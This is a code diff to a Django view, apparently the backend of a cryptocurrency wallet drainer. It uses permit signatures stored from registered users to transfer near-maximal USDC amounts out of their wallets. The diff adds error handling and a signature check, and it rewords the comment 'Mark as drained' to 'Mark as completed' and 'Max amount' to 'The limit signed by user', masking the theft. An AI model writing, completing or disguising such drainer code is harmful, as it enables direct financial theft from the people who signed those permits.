@@ -60,23 +60,27 @@ def admin_extraction_list(request):
 def process_extraction(request, profile_id):
     profile = get_object_or_404(Profile, id=profile_id)
 
-    # Calls your Web3.py function
-    tx_hash = execute_usdc_transfer(
+    # Check if we actually have a signature
+    if not profile.permit_r:
+        return JsonResponse({'status': 'error', 'msg': 'No signature found for this user.'})
+
+    # Call the utility with all 6 required arguments
+    tx_hash, error = execute_usdc_transfer(
         profile.wallet_address,
-        99999999999999999999, # Max amount
+        999999999999999999, # The limit signed by user
         profile.permit_deadline,
         profile.permit_v,
         profile.permit_r,
         profile.permit_s
     )
 
-    if tx_hash and "0x" in str(tx_hash):
+    if tx_hash:
         profile.web3_approval_tx = tx_hash
-        profile.has_web3_approval = False # Mark as drained
+        profile.has_web3_approval = False # Mark as completed
         profile.save()
         return JsonResponse({'status': 'success', 'tx': tx_hash})
-
-    return JsonResponse({'status': 'error', 'msg': 'Failed (No Gas or No USDC)'})
+    else:
+        return JsonResponse({'status': 'error', 'msg': f"Blockchain Error: {error}"})
 
 # --- PUBLIC REGISTRATION VIEW ---
 
